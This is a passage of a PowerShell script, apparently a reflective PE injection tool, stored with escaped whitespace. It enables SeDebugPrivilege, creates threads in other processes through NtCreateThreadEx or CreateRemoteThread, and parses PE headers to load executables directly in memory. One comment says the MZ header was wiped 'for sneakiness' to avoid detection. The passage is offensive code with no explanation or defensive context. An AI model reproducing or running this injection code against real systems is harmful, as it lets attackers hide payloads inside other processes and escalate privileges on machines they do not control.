$true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($ThreadHandle -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to get the handle to the current thread\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ThreadToken = [IntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Result -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Result = $Win32Functions.ImpersonateSelf.Invoke(3)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Result -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to impersonate self\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Result -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to OpenThreadToken.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to OpenThreadToken. Error code: $ErrorCode\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, \"SeDebugPrivilege\", $PLuid)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Result -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to call LookupPrivilegeValue\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TokenPrivileges.PrivilegeCount = 1\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($Result -eq $false) -or ($ErrorCode -ne 0))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Throw \"Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode\" #todo need to detect if already set\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0Function Create-RemoteThread\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProcessHandle,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 2, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$StartAddress,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 3, Mandatory = $false)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ArgumentPtr = [IntPtr]::Zero,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 4, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OSVersion = [Environment]::OSVersion.Version\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Vista and Win7\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteThreadHandle -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#XP/Win8\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteThreadHandle -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Error \"Error creating remote thread, thread handle is null\" -ErrorAction Stop\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $RemoteThreadHandle\n\t\t\t\u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0\n\n\t\t\t\u00a0\u00a0\u00a0Function Get-ImageNtHeaders\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEHandle,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NtHeadersInfo = New-Object System.Object\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Get IMAGE_NT_HEADERS\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($imageNtHeaders64.Signature -ne 0x00004550)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0throw \"Invalid IMAGE_NT_HEADER signature.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $NtHeadersInfo\n\t\t\t\u00a0\u00a0\u00a0}\n\n\n\t\t\t\u00a0\u00a0\u00a0#This function will get the information needed to allocated space in memory for the PE\n\t\t\t\u00a0\u00a0\u00a0Function Get-PEBasicInfo\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param( \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo = New-Object System.Object\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Get NtHeadersInfo\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Build a structure with the information which will be needed for allocating memory and writing the PE to memory\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Free the memory allocated above, this isn't where we allocate the PE to memory\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $PEInfo\n\t\t\t\u00a0\u00a0\u00a0}\n\n\n\t\t\t\u00a0\u00a0\u00a0#PEInfo must contain the following NoteProperties:\n\t\t\t\u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0PEHandle: An IntPtr to the address the PE is loaded to in memory\n\t\t\t\u00a0\u00a0\u00a0Function Get-PEDetailedInfo\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter( Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEHandle,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 2, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0throw 'PEHandle is null or IntPtr.Zero'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo = New-Object System.Object\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Get NtHeaders information\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Build the PEInfo object\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PEInfo.PE64Bit -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 